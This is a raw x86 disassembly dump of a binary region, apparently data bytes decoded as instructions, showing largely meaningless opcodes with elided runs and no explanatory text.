  44484e:	push   es
  44484f:	sbb    DWORD PTR [ebx],edi
  444851:	push   es
  444852:	mov    bh,0x8
  444854:	inc    ebx
  444855:	mov    bl,0x3e
  444857:	sbb    DWORD PTR [ebx],edi
  444859:	ss inc ebx
  44485b:	js     0x4448c2
  44485d:	out    dx,al
  44485e:	xchg   ebp,eax
  44485f:	pop    eax
  444860:	scas   al,BYTE PTR es:[edi]
  444861:	std    
  444862:	mov    bh,0xd5
  444864:	mov    ecx,0x905097ed
  444869:	mov    ?,WORD PTR [edx+0x18]
  44486c:	push   ecx
  44486d:	cs daa 
  44486f:	jns    0x444821
  444871:	loopne 0x444829
  444873:	or     BYTE PTR [ebx+esi*4],bh
  444876:	push   cs
  444877:	add    DWORD PTR [eax+0x112e0],esp
	...
  444895:	and    al,0xee
  444897:	push   edi
  444898:	sbb    BYTE PTR [esi+edi*8],ch
  44489b:	aaa    
  44489c:	aad    0xd9
  44489e:	in     eax,dx
  44489f:	pop    ss
  4448a0:	push   eax
  4448a1:	push   eax
  4448a2:	mov    ?,WORD PTR [ebx+0x8dbc27]
  4448a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4448a9:	shl    esp,cl
  4448ab:	xor    al,0x18
  4448ad:	leave  
  4448ae:	(bad)  
  4448b0:	cmp    BYTE PTR [ecx+eiz*2-0x7b],al
  4448b4:	push   ss
  4448b5:	cld    
  4448b6:	daa    
  4448b7:	in     eax,0xf9
  4448b9:	hlt    
  4448ba:	xor    al,0x25
  4448bc:	sbb    ah,bh
  4448be:	dec    ecx
  4448bf:	jb     0x4448b2
  4448c1:	in     al,dx
  4448c2:	dec    ecx
  4448c3:	in     eax,dx
  4448c4:	inc    ebp
  4448c5:	cmp    al,0x34
  4448c7:	and    eax,0xed4343fa
  4448cc:	inc    ebp
  4448cd:	sub    al,0xb1
  4448cf:	and    edx,DWORD PTR ds:0xf123d92b
  4448d5:	inc    eax
  4448d6:	loope  0x4448d1
  4448d8:	(bad)  
  4448d9:	das    
  4448da:	jb     0x4448d4
  4448dc:	sub    al,0xbb
  4448de:	cmp    DWORD PTR [edi+0x4f7e3],esi
  4448e4:	rcr    ah,cl
  4448e6:	ins    BYTE PTR es:[edi],dx
  4448e7:	and    BYTE PTR ds:0xe900727c,bh
  4448ed:	test   DWORD PTR [esi+esi*4],0x4f7f2
  4448f4:	xchg   edx,eax
  4448f5:	dec    esp
  4448f6:	jb     0x4448ec
  4448f8:	xor    al,0x0
	...
  444912:	xor    edi,DWORD PTR [ecx]
  444914:	mov    bh,0xf3
  444916:	test   DWORD PTR [eax+eax*1],0x74804092
  44491d:	(bad)
  444920:	cld    
  444921:	adc    al,0x33
  444923:	cmp    DWORD PTR [edi+0x4f7d3],esi
  444929:	push   edx
  44492a:	lock jg 0x444971
  44492d:	add    eax,0xddc78650
  444932:	repnz or DWORD PTR [eax-0xf],0x1bc492
  44493a:	test   BYTE PTR [eax],dh
  44493c:	in     al,0x0
  44493e:	mov    cs,WORD PTR [ebx]
  444940:	inc    eax
  444941:	ror    BYTE PTR [esi+0x5],0xfa
  444945:	je     0x444926
  444947:	mov    bh,0xd4
  444949:	mov    ebx,DWORD PTR [ecx+0x268b5818]
  44494f:	mov    eax,0xda0c1c4f
  444954:	cli    
  444955:	sub    ch,ah
  444957:	rcr    eax,0x3
  44495a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44495b:	jmp    0xba15c1e0
  444960:	push   ecx
  444961:	cmp    al,0x56
  444963:	clc    
  444964:	test   BYTE PTR [ecx+edi*4+0x20],bl
  444968:	xor    bl,BYTE PTR [ecx+edi*8+0x34]
  44496c:	outs   dx,BYTE PTR ds:[esi]
  44496d:	adc    al,0x6
  44496f:	rol    BYTE PTR [edx+0x1d601418],1
  444975:	adc    al,0x0
	...
  44498f:	sahf   
  444990:	iret   
  444991:	sbb    BYTE PTR [eax-0x67],0x7f
  444995:	jecxz  0x4449a2
  444997:	mov    WORD PTR [eax+0x1d],fs
  44499a:	adc    al,0x14
  44499c:	adc    al,0xb3
  44499e:	add    DWORD PTR [ebp+0x4],ebx
  4449a1:	add    bl,dl
  4449a3:	jle    0x444a1c
  4449a5:	jl     0x4449e4
  4449a7:	or     eax,0x4f003ac1
  4449ac:	push   ebp
  4449ad:	add    DWORD PTR [edi],ecx
  4449af:	mov    es,ecx
  4449b1:	push   es
  4449b2:	jle    0x44494c
  4449b4:	cmp    esi,DWORD PTR [eax+0x23]
  4449b7:	mov    cx,0x3861
  4449bb:	(bad)  
  4449bc:	pop    edi
  4449bd:	sbb    eax,0x6dee6614
  4449c2:	or     al,BYTE PTR [esi]
  4449c4:	jmp    0x444a40
  4449c6:	ret    
  4449c7:	es mov ecx,0xc2f40457
  4449cd:	cli    
  4449ce:	and    al,0x7
  4449d0:	iret   
  4449d1:	es jge 0x444a06
  4449d4:	xor    edi,DWORD PTR [eax+esi*2-0x8]
  4449d8:	mov    dl,0xa0
  4449da:	and    esp,esp
  4449dc:	xor    ah,BYTE PTR [esi]
  4449de:	jb     0x4449e1
  4449e0:	add    esp,DWORD PTR ds:0x42cb77f
  4449e6:	add    ah,dh
  4449e8:	mov    ah,0xa4
  4449ea:	bswap  edi
  4449ec:	and    BYTE PTR [edx],bl
  4449ee:	cmc    
  4449ef:	retf   
  4449f0:	out    0x83,al
  4449f2:	rol    DWORD PTR [eax],0x0
	...
  444a09:	add    BYTE PTR [eax],al
  444a0b:	add    ch,dh
  444a0d:	sub    al,0xfd
  444a0f:	jmp    FWORD PTR [ebp-0x7b]
  444a12:	in     eax,dx
  444a13:	jl     0x4449c5
  444a15:	ins    DWORD PTR es:[edi],dx
  444a16:	push   0xa6885155
  444a1b:	mov    esp,0xcc3871b8
  444a20:	mov    al,0x69
  444a22:	cmp    ah,cl
  444a24:	test   al,0xf8
  444a26:	jp     0x444a14
  444a28:	ja     0x444aa3
  444a2a:	enter  0x2184,0x5e
  444a2e:	adc    al,0xc0
  444a30:	repz scas al,BYTE PTR es:[edi]
  444a32:	cmp    eax,DWORD PTR [ebp+0x105d6cb5]
  444a38:	jmp    FWORD PTR [esi+ebp*4-0x7a]
  444a3c:	mov    cl,0xc9
  444a3e:	je     0x444a83
  444a40:	mov    WORD PTR [eax+edi*4-0x6c179255],?
  444a47:	xchg   DWORD PTR [ecx-0x73bc8b2f],edi
  444a4d:	mov    ah,0xb8
  444a4f:	mov    ebx,0x2d43e06d
  444a54:	xor    al,0x16
  444a56:	jnp    0x444ad3
  444a58:	add    BYTE PTR [ecx+0x50e7431],ah
  444a5e:	dec    esi
  444a5f:	add    ch,BYTE PTR [edi-0x65]
  444a62:	out    0x3,eax
  444a64:	hlt    
  444a65:	add    al,0xe2
  444a67:	nop
  444a68:	add    al,al
  444a6a:	ror    BYTE PTR [eax-0x50],0xc9
  444a6e:	mov    dh,BYTE PTR [edi+0x0]
	...
  444a89:	mov    al,0xc9
  444a8b:	add    ah,0xc0
  444a8e:	inc    edx
  444a8f:	mov    ch,0x59
  444a91:	jns    0x444a43
  444a93:	into   
  444a94:	jl     0x444a94
  444a96:	mov    esi,DWORD PTR [edi+eax*2+0x3e7069c]
  444a9d:	hlt    
  444a9e:	xchg   esp,eax
  444a9f:	mov    DWORD PTR [eax+edx*2+0x470442c0],eax
  444aa6:	jmp    FWORD PTR [esi+0x7604bc84]
  444aac:	push   ebp
  444aad:	jae    0x444a6f
  444aaf:	add    cl,BYTE PTR ds:0x7ae3afbc
  444ab5:	aaa    
  444ab6:	cmp    DWORD PTR [esi+0x3b],ebp
  444ab9:	ja     0x444b00
  444abb:	push   esp
  444abc:	sbb    esi,DWORD PTR [ecx-0x40]
  444abf:	cli    
  444ac0:	jl     0x444aa6
  444ac2:	cmp    eax,0x3cbf424
  444ac7:	out    0x3,eax
  444ac9:	jns    0x444a93
  444acb:	(bad)  
  444acc:	jp     0x444ac0
  444ace:	and    edi,0x601578ff
  444ad4:	std    
  444ad5:	call   0x34ed35de
  444ada:	jmp    edi
  444adc:	add    esi,esp
  444ade:	add    al,0xd6
  444ae0:	inc    ebx
  444ae1:	scas   al,BYTE PTR es:[edi]
  444ae2:	mov    DWORD PTR [esi+eiz*4+0x23dd288],eax
  444ae9:	hlt    
  444aea:	add    al,0xe7
  444aec:	or     al,0x0
	...
  444b06:	jns    0x444ab7
  444b08:	jmp    ebx
  444b0a:	adc    eax,0x540c7bb9
  444b0f:	add    eax,0xf138ec73
  444b14:	xlat   BYTE PTR ds:[ebx]
  444b15:	fcmovnb st,st(0)
  444b17:	out    dx,eax
  444b18:	(bad)  
  444b19:	(bad)  
  444b1b:	jge    0x444b78
  444b1d:	dec    ebp
  444b1e:	jns    0x444b56
  444b20:	stc    
  444b21:	jmp    0x6d0acb1d
  444b26:	sbb    esp,edx
  444b28:	jmp    ebp
  444b2a:	test   BYTE PTR [eax+0x46f0854a],dh
  444b30:	and    eax,0x3f13af3f
  444b35:	push   0x2e
  444b37:	or     al,0x72
  444b39:	push   es
  444b3a:	push   eax
  444b3b:	mov    dl,0x7
  444b3d:	add    DWORD PTR fs:[ebx-0x4eda93f4],edi
  444b44:	add    ch,BYTE PTR [edx+0x2f]
  444b47:	ss ins DWORD PTR es:[edi],dx
  444b49:	jecxz  0x444bab
  444b4b:	fdivr  QWORD PTR [ecx+eiz*1+0x3c]
  444b4f:	fild   DWORD PTR [esp+ecx*8-0x56d287b3]
  444b56:	mov    edx,0x806f437e
  444b5b:	ss stc 
  444b5d:	jmp    0x744c6b59
  444b62:	push   esp
  444b63:	loopne 0x444b64
  444b65:	call   0x4fd45061
	...
  444b82:	add    bh,ch
  444b84:	enter  0x6502,0x4a
  444b88:	cmp    BYTE PTR [ebp-0x14],al
  444b8b:	xor    DWORD PTR [edi+0x7e39ebbf],0x4c
  444b92:	in     al,dx
  444b93:	shl    DWORD PTR [edi+0x1e25eff7],cl
  444b99:	test   DWORD PTR [eax],eax
  444b9b:	loopne 0x444bcd
  444b9d:	sub    al,0xc0
  444b9f:	shl    dl,1
  444ba1:	jae    0x444bcf
  444ba3:	add    eax,DWORD PTR [edx+0x451d473c]
  444ba9:	sbb    DWORD PTR [edi],ecx
  444bab:	cmp    BYTE PTR [eax+eax*2],0xf
  444baf:	cmp    BYTE PTR [esi+eax*2-0x7c],0x96
  444bb4:	push   ebx
  444bb5:	adc    eax,0x46049466
  444bba:	jb     0xbaaa8bfc
  444bc0:	inc    esp
  444bc1:	inc    esi
  444bc2:	test   BYTE PTR [esi+0x56],dl
  444bc5:	add    DWORD PTR [ebp+0x407d6d89],ecx
  444bcb:	(bad)  
  444bcc:	(bad)  
  444bcd:	imul   edx,esp,0xe87af366
  444bd3:	fld    QWORD PTR [ecx-0x34050009]
  444bd9:	jae    0x444c11
  444bdb:	test   DWORD PTR [esp+ecx*1-0x39],eax
  444bdf:	nop
  444be0:	in     al,dx
  444be1:	pop    edi
  444be2:	dec    ebp
  444be3:	pop    ebp
  444be4:	or     BYTE PTR [edi+0x45],bh
	...
  444bfe:	add    BYTE PTR [eax],al
  444c00:	std    
  444c01:	push   0xb18d4045
  444c06:	inc    esp
  444c07:	in     al,0xc6
  444c09:	sbb    BYTE PTR [eax-0x6b72620],bh
  444c0f:	sub    al,0x9f
  444c11:	push   es
  444c12:	add    BYTE PTR [eax],al
  444c14:	add    al,0x45
  444c16:	aad    0xb8
  444c18:	in     eax,dx
  444c19:	ins    DWORD PTR es:[edi],dx
  444c1a:	cmp    DWORD PTR [eax],eax
  444c1c:	clc    
  444c1d:	push   es
  444c1e:	cli    
  444c1f:	call   FWORD PTR [ebp-0xd]
  444c22:	cmp    al,0xe4
  444c24:	dec    ebp
  444c25:	or     DWORD PTR [eax],eax
  444c27:	add    BYTE PTR [esi-0xbba7bd3],al
  444c2d:	cmp    DWORD PTR [ebx+eax*2+0x28],edi
  444c31:	imul   eax,eax,0xffffffe3
  444c34:	out    0x1d,eax
  444c36:	std    
  444c37:	jmp    FWORD PTR [ebp-0x17]
  444c3a:	arpl   WORD PTR [ebp+0xe7651c9],ax
  444c40:	out    0x5d,eax
  444c42:	jl     0x444c87
  444c44:	sbb    al,0xb5
  444c46:	mov    edi,0x2d616df3
  444c4b:	test   ecx,eax
  444c4d:	fld    DWORD PTR [edi+edi*8-0x3302e1f5]
  444c54:	adc    al,0xb5
  444c56:	scas   eax,DWORD PTR es:[edi]
  444c57:	out    0x6f,eax
  444c59:	(bad)  
  444c5a:	ja     0x444ca4
  444c5c:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  444c5e:	(bad)  
  444c5f:	sar    DWORD PTR [ebp+0x68],cl
  444c62:	and    eax,0x87
	...
  444c7b:	add    BYTE PTR [eax],al
  444c7d:	xor    edx,edi
  444c7f:	jge    0x444c7b
  444c81:	cmc    
  444c82:	cwde   
  444c83:	cli    
  444c84:	cmp    ch,BYTE PTR [eax]
  444c86:	pop    ds
  444c87:	std    
  444c88:	(bad)  
  444c89:	fbld   TBYTE PTR [edi]
  444c8b:	jle    0x444c87
  444c8d:	div    BYTE PTR [eax+0x20243af5]
  444c93:	std    
  444c94:	inc    DWORD PTR [ebx]
  444c96:	lahf   
  444c97:	push   eax
  444c98:	jmp    FWORD PTR [ebx+0x53761d]
  444c9e:	mov    ch,0xa8
  444ca0:	out    dx,eax
  444ca1:	(bad)  
  444ca2:	sub    esi,DWORD PTR [edx+0x47]
  444ca5:	hlt    
  444ca6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  444ca7:	rcl    bl,0x7f
  444caa:	clc    
  444cab:	dec    edi
  444cac:	test   DWORD PTR [ecx],esi
  444cae:	outs   dx,BYTE PTR ds:[esi]
  444caf:	ja     0x444d24
  444cb1:	nop
  444cb2:	mov    bh,0x3e
  444cb4:	es movs DWORD PTR es:[edi],DWORD PTR ss:[esi]
  444cb7:	mov    eax,0xfcbafb0e
  444cbc:	test   BYTE PTR [esp+eax*1],ch
  444cbf:	fidiv  WORD PTR ds:0xbfa0fedf
  444cc5:	add    eax,DWORD PTR ds:0x16b77b09
  444ccb:	jle    0x444ce7
  444ccd:	mov    esi,0x4bbf6e12
  444cd2:	add    esi,DWORD PTR [edx]
  444cd4:	add    al,0x79
  444cd6:	rol    DWORD PTR [esi-0x2481cbff],0xfb
  444cdd:	jnp    0x444ca0
  444cdf:	idiv   BYTE PTR [eax+0x0]
	...
  444cfa:	scas   eax,DWORD PTR es:[edi]
  444cfb:	push   eax
  444cfc:	sar    DWORD PTR [eax-0x8],0xfc
  444d00:	enter  0xb77a,0x16
  444d04:	ds cli 
  444d06:	sar    BYTE PTR ds:0xa4ebbf29,1
  444d0c:	sar    BYTE PTR [edx+0x3f],0x17
  444d10:	pop    esi
  444d11:	cmp    DWORD PTR [ecx],edx
  444d13:	aas    
  444d14:	pop    esi
  444d15:	cmp    eax,0x8a1eb079
  444d1a:	(bad)  [edx]
  444d1c:	out    0x3,eax
  444d1e:	shl    DWORD PTR [edi],0x5e
  444d21:	mov    bh,0xc7
  444d23:	push   esi
  444d24:	cli    
  444d25:	js     0x444d56
  444d27:	sbb    eax,0x80b3bf70
  444d2c:	mov    bl,0x6e
  444d2e:	hlt    
  444d2f:	add    al,0xe7
  444d31:	add    ebp,DWORD PTR [ecx+0x6af85c3a]
  444d37:	jle    0x444d9d
  444d39:	hlt    
  444d3a:	outs   dx,BYTE PTR ds:[esi]
  444d3b:	mov    fs,edi
  444d3d:	add    esi,esp
  444d3f:	add    al,0xfe
  444d41:	xor    eax,0xa6046d1
  444d46:	pop    es
  444d47:	sub    eax,0x6d7cb874
  444d4c:	call   0x494154
  444d51:	call   0x71e2:0xb14b87d7
  444d58:	je     0x444d4e
  444d5a:	loop   0x444dc4
  444d5c:	and    al,0xe9
	...
  444d76:	add    bh,dh
  444d78:	add    al,0x0
  444d7a:	mov    eax,0x14bf85af
  444d7f:	scas   al,BYTE PTR es:[edi]
  444d80:	test   eax,eax
  444d82:	std    
  444d83:	inc    ebx
  444d84:	jg     0x444dd6
  444d86:	jle    0x444d5c
  444d88:	inc    ecx
  444d89:	std    
  444d8a:	cwde   
  444d8b:	scas   al,BYTE PTR es:[edi]
  444d8c:	aad    0xf7
  444d8e:	and    BYTE PTR [eax],0x45
  444d91:	inc    ebx
  444d92:	popa   
  444d93:	test   DWORD PTR [eax+eax*1],0xefc674e9
  444d9a:	jmp    0x444e1b
  444d9c:	sub    al,0xf9
  444d9e:	jmp    0xad42f49a
  444da3:	push   edx
  444da4:	data16 jae 0x444d7e
  444da7:	cld    
  444da8:	int    0xeb
  444daa:	out    0x6b,al
  444dac:	dec    eax
  444dad:	add    cl,ch
  444daf:	test   DWORD PTR [edi+0x74e0194b],0xfd92720f
  444db9:	or     BYTE PTR [esi-0x2d],bl
  444dbc:	shl    DWORD PTR [esp+ebp*4],0x3b
  444dc0:	cld    
  444dc1:	sbb    ebp,0x72f92c30
  444dc7:	ret    0x1d3d
  444dca:	jl     0x444e0b
  444dcc:	mov    dh,BYTE PTR [ebx+0x25]
  444dcf:	in     al,dx
  444dd0:	mov    ch,0xcf
  444dd2:	div    BYTE PTR [ebx+0x32]
  444dd5:	cli    
  444dd6:	fidiv  WORD PTR [edi]
  444dd8:	mov    BYTE PTR [ebx-0x23],dl
	...
  444df3:	add    BYTE PTR [ebp+0x42],bh
  444df6:	jae    0x444dd9
  444df8:	jb     0x444db7
  444dfa:	sti    
  444dfb:	add    BYTE PTR [esp+edx*2],al
  444dfe:	in     eax,dx
  444dff:	mov    ecx,DWORD PTR [ecx+eax*4+0x53d6e83d]
  444e06:	ror    DWORD PTR [ebp-0x347c82a7],0x46
  444e0d:	mov    edi,0xb0654580
  444e12:	clc    
  444e13:	call   FWORD PTR [ebp+0x5]
  444e16:	sti    
  444e17:	sar    BYTE PTR [esi-0x18],1
  444e1a:	xor    dl,BYTE PTR [ebp+0x61]
  444e1d:	jns    0x444e35
  444e1f:	lea    ebp,[ecx]
  444e21:	dec    esp
  444e22:	popf   
  444e23:	nop
  444e24:	adc    ch,BYTE PTR [esi+0x7b5a2b35]
  444e2a:	sar    BYTE PTR [esi+0x21],0x47
  444e2e:	cmp    al,BYTE PTR [ebx-0x4004f525]
  444e34:	out    0x4b,al
  444e36:	in     eax,0x72
  444e38:	mov    dh,0x81
  444e3a:	ins    DWORD PTR es:[edi],dx
  444e3b:	les    eax,FWORD PTR [esi-0x67742eb5]
  444e41:	cld    
  444e42:	mov    dh,0x1
  444e44:	fld    QWORD PTR [eax+eax*1]
  444e47:	sar    DWORD PTR [edx],cl
  444e49:	or     bh,cl
  444e4b:	mov    DWORD PTR [eax+0x355580d8],edx
  444e51:	mov    al,bh
  444e53:	add    DWORD PTR [eax-0x4],ebp
  444e56:	js     0x444e52
	...
  444e70:	add    BYTE PTR [ecx-0x19fffff9],cl
  444e76:	(bad)  
  444e77:	jp     0x444e71
  444e79:	lahf   
  444e7a:	ins    DWORD PTR es:[edi],dx
  444e7b:	add    DWORD PTR [ecx-0x4ab59],eax
  444e81:	lea    esi,[edi+0x63]
  444e84:	mov    ebx,DWORD PTR [ebx+0x7f]
  444e87:	ins    DWORD PTR es:[edi],dx
  444e88:	adc    al,0x6
  444e8a:	inc    BYTE PTR [edi-0x76520bf4]
  444e90:	or     ch,BYTE PTR [esi-0x17]
  444e93:	aas    
  444e94:	mov    BYTE PTR [eax],dh
  444e96:	int    0x3
  444e98:	test   edx,edi
  444e9a:	mov    dl,0xcf
  444e9c:	out    0x1f,eax
  444e9e:	inc    sp
  444ea0:	div    esi
  444ea2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  444ea3:	xlat   BYTE PTR ds:[ebx]
  444ea4:	iret   
  444ea5:	shl    BYTE PTR [eax+ecx*8-0x5c6b0971],cl
  444eac:	stc    
  444ead:	dec    ebx
  444eae:	xchg   edi,eax
  444eaf:	mov    al,BYTE PTR [ebx+0x3c]
  444eb2:	test   eax,0x53dd743c
  444eb7:	loopne 0x444eac
  444eb9:	out    0x8b,eax
  444ebb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  444ebc:	xchg   cl,al
  444ebe:	dec    ebx
  444ebf:	mov    dl,BYTE PTR [ebx+0xc]
  444ec2:	push   0xb5b40fc8
  444ec7:	fisttp WORD PTR [esi]
  444ec9:	jg     0x444f2c
  444ecb:	or     eax,0x899bf887
  444ed0:	inc    ebx
  444ed1:	sbb    al,0xa3
  444ed3:	xlat   BYTE PTR ds:[ebx]
  444ed4:	sti    
	...
  444eed:	add    BYTE PTR [ecx+0x3a],ch
  444ef0:	mov    BYTE PTR [eax],al
  444ef2:	hlt    
  444ef3:	sbb    eax,0x523184fd
  444ef8:	add    al,0x8
  444efa:	outs   dx,DWORD PTR ds:[esi]
  444efb:	push   0xb53b5515
  444f00:	or     al,0x2d
  444f02:	mov    ah,0x6f
  444f04:	mov    ah,bl
  444f06:	sub    ebx,ebx
  444f08:	fstp   DWORD PTR [eax+0x7c]
  444f0b:	sbb    al,0xfd
  444f0d:	push   esp
  444f0f:	addr16 mov ah,bl
  444f12:	push   ecx
  444f13:	fisttp DWORD PTR [ecx+0x28a341f9]
  444f19:	jg     0x444eab
  444f1b:	or     eax,0x4f40003
  444f20:	mov    al,cl
  444f22:	push   ebx
  444f23:	ret    
  444f24:	out    0xf4,al
  444f26:	mov    dh,0x7d
  444f28:	sub    al,0x40
  444f2a:	jnp    0x444eb5
  444f2c:	(bad)  
  444f2d:	aas    
  444f2e:	jge    0x444f5f
  444f30:	jo     0x444ec1
  444f32:	push   eax
  444f33:	xor    DWORD PTR [edx-0x70668cbf],edi
  444f39:	aas    
  444f3a:	pop    ebp
  444f3b:	das    
  444f3c:	pusha  
  444f3d:	lahf   
  444f3e:	inc    eax
  444f3f:	xor    DWORD PTR [edx-0x488684bf],esp
  444f45:	aas    
  444f46:	dec    ebp
  444f47:	das    
  444f48:	pusha  
  444f49:	jg     0x444f7b
  444f4b:	xor    DWORD PTR [edx+0x5c80d641],ecx
  444f51:	cmp    al,0x0
	...
  444f6b:	das    
  444f6c:	das    
  444f6d:	jp     0x444f19
  444f6f:	jg     0x444ef2
  444f71:	cmp    DWORD PTR [edi],0x1d
  444f74:	das    
  444f75:	add    DWORD PTR [eax+0x41643c7f],edx
  444f7b:	or     eax,0x30876aa6
  444f80:	xor    DWORD PTR [edx+0x41],edx
  444f83:	xchg   esi,eax
  444f84:	add    BYTE PTR [esp+eax*2-0x55bdd101],0x7f
  444f8c:	pusha  
  444f8d:	jnp    0x444fce
  444f8f:	in     eax,dx
  444f90:	cs push ebx
  444f92:	xchg   ecx,eax
  444f93:	ja     0x444fca
  444f95:	sub    al,0x41
  444f97:	fnstsw WORD PTR [edx-0x54]
  444f9a:	pop    es
  444f9b:	jnp    0x444f25
  444f9d:	(bad)  
  444f9f:	int    0x2e
  444fa1:	fs (bad) 
  444fa3:	test   DWORD PTR [ebp+0x64],0x22ebef4
  444faa:	add    esi,esp
  444fac:	add    esp,edi
  444fae:	mov    dh,BYTE PTR [edi+0x39]
  444fb1:	add    ah,dh
  444fb3:	xor    al,0x2c
  444fb5:	test   DWORD PTR [ecx+0x34df9cdb],ebp
  444fbb:	mov    eax,0xd364882e
  444fc0:	sub    ecx,edi
  444fc2:	(bad)  
  444fc3:	xor    al,0x12
  444fc5:	cld    
  444fc6:	clc    
  444fc7:	mov    bh,0x2e
  444fc9:	xchg   BYTE PTR [esp+esi*4],dh
  444fcc:	(bad)  
  444fce:	rol    DWORD PTR [eax],1
	...
  444fe8:	add    al,0x5
  444fea:	add    cl,ch
  444fec:	scas   al,BYTE PTR es:[edi]
  444fed:	outs   dx,DWORD PTR ds:[esi]
  444fee:	test   DWORD PTR [esi+0x44ec8942],ebp
  444ff4:	pop    ds
  444ff5:	mov    esp,0x40b49ef8
  444ffa:	int3   
  444ffb:	shl    dl,cl
  444ffd:	enter  0x2abf,0xf0
  445001:	mov    cl,0xfc
  445003:	stos   BYTE PTR es:[edi],al
  445004:	test   DWORD PTR [edi+eiz*8],0x4fda3
  44500b:	bound  esi,QWORD PTR [edx+edx*8+0x6f187b84]
  445012:	je     0x445012
  445014:	jp     0x445049
  445016:	je     0x445012
  445018:	and    BYTE PTR [ecx-0x79219c07],cl
  44501e:	adc    BYTE PTR [ecx-0x21],ah
  445021:	mov    edx,0xeeb7d887
  445026:	xor    BYTE PTR [edi],0xa2
  445029:	push   ds
  44502a:	push   ebp
  44502b:	xchg   edi,eax
  44502c:	cmp    BYTE PTR [ecx-0x34],al
  44502f:	sbb    eax,0x35cc412b
  445034:	inc    ebx
  445035:	inc    ecx
  445036:	int3   
  445037:	sub    eax,0x62cc413b
  44503c:	xor    al,0xd2
  44503e:	test   ch,bh
  445040:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  445041:	mov    BYTE PTR [ebx+0x0],dl
  445044:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  445045:	dec    esp
  445046:	test   al,bh
  445048:	mov    dh,0xef
  44504a:	ins    DWORD PTR es:[edi],dx
  44504b:	outs   dx,BYTE PTR ds:[esi]
	...
  445064:	add    BYTE PTR [esi],dl
  445066:	aas    
  445067:	add    eax,0x4aff918d
  44506c:	mov    eax,esp
  44506e:	les    ecx,FWORD PTR [ebp-0x15]
  445071:	sahf   
  445072:	xchg   esp,eax
  445073:	inc    ecx
  445074:	add    BYTE PTR [esi],dl
  445076:	ins    BYTE PTR es:[edi],dx
  445077:	cmc    
  445078:	mov    eax,DWORD PTR [edi+0x29]
  44507b:	lock ja 0x445081
  44507e:	xchg   esp,eax
  44507f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  445080:	and    al,0x5d
  445082:	add    DWORD PTR [eax],eax
  445084:	add    dh,dl
  445086:	push   ebx
  445087:	or     eax,0xf8580353
  44508c:	push   ebp
  44508d:	dec    ebp
  44508e:	add    ah,0xc
  445091:	ror    al,1
  445093:	jne    0x445097
  445095:	(bad)  
  445096:	into   
  445097:	cli    
  445098:	je     0x4450b3
  44509a:	sub    dh,al
  44509c:	jbe    0x445020
  44509e:	jns    0x4450e5
  4450a0:	or     al,0xa6
  4450a2:	dec    ebx
  4450a3:	add    DWORD PTR [ebx+0x3bbf799c],ecx
  4450a9:	push   0x6c
  4450ab:	sbb    BYTE PTR [ebp-0x74eb933c],al
  4450b1:	(bad)  
  4450b2:	sbb    eax,ecx
  4450b4:	nop
  4450b5:	xchg   edi,eax
  4450b6:	adc    BYTE PTR [edx+0x1c790c14],al
  4450bc:	add    DWORD PTR [ebx+0x50401080],ebp
  4450c2:	rep ins BYTE PTR es:[edi],dx
  4450c4:	lock push esi
  4450c6:	push   esi
  4450c7:	add    eax,0x8b
	...
  4450e0:	add    BYTE PTR [eax],al
  4450e2:	add    BYTE PTR [eax],0x23
  4450e5:	stc    
  4450e6:	(bad)  
  4450e7:	out    dx,al
  4450e8:	outs   dx,BYTE PTR ds:[esi]
  4450e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4450ea:	mov    ecx,DWORD PTR [edi+0x58]
  4450ed:	mov    esi,esp
  4450ef:	clc    
  4450f0:	fidivr WORD PTR [eax+ebp*4-0x3f33aff6]
  4450f7:	repnz dec edi
  4450f9:	int3   
  4450fa:	mov    eax,0xb0cc4fda
  4450ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  445100:	cmp    BYTE PTR [ebx+0x6f],dl
  445103:	sub    al,BYTE PTR [esp+ebp*8-0x2e30c]
  44510a:	daa    
  44510b:	mov    bh,0xdf
  44510d:	pop    es
  44510e:	sub    esp,DWORD PTR [edi+0x77710bbf]
  445114:	mov    eax,0xb1437927
  445119:	and    ebp,DWORD PTR [ebx+0x51]
  44511c:	lds    edx,FWORD PTR [ecx]
  44511e:	mov    ah,0x1d
  445120:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  445121:	dec    ebp
  445123:	sbb    eax,0x1dddffa7
  445128:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  445129:	push   DWORD PTR [edx]
  44512b:	push   ds
  44512c:	adc    eax,DWORD PTR [eax]
  44512e:	hlt    
  44512f:	sbb    eax,0x7b3aeb25
  445134:	cmp    bh,BYTE PTR [ebp+0x38]
  445137:	dec    edx
  445138:	ficom  DWORD PTR [edi+edi*2-0x7f]
  44513c:	loopne 0x4450fa
  44513e:	retf   0xb7a6
  445141:	(bad)  
  445143:	mov    ah,0xb2
  445145:	add    DWORD PTR [eax],eax
	...
  44515f:	ja     0x445182
  445161:	adc    DWORD PTR [eax],eax
  445163:	add    DWORD PTR [eax],0x2bac1339
  445169:	mov    ebp,0xa71d8dff
  44516e:	call   FWORD PTR [ebp+0x1e]
  445171:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  445172:	call   FWORD PTR [ebp+0x1e]
  445175:	inc    edx
  445176:	add    BYTE PTR [edx],cl
  445178:	push   ds
  445179:	std    
  44517a:	dec    esp
  44517c:	mov    dh,0x3a
  44517e:	stc    
  44517f:	rol    DWORD PTR [esi+eiz*2],cl
  445182:	inc    edi
  445183:	loopne 0x44514f
  445185:	mov    ecx,0xb42178da
  44518a:	inc    edx
  44518b:	cmp    DWORD PTR [eiz*8-0xe44584f],ebp
  445192:	outs   dx,BYTE PTR ds:[esi]
  445193:	scas   al,BYTE PTR es:[edi]
  445194:	pop    es
  445195:	inc    BYTE PTR [ebp+0x37]
  445198:	xor    edi,esp
  44519a:	add    esi,esp
  44519c:	add    al,0x60
  44519e:	loopne 0x44512f
  4451a0:	jge    0x445206
  4451a2:	cmp    al,0x7f
  4451a4:	(bad)  
  4451a5:	out    0x3,eax
  4451a7:	hlt    
  4451a8:	add    al,0x5e
  4451aa:	inc    ebp
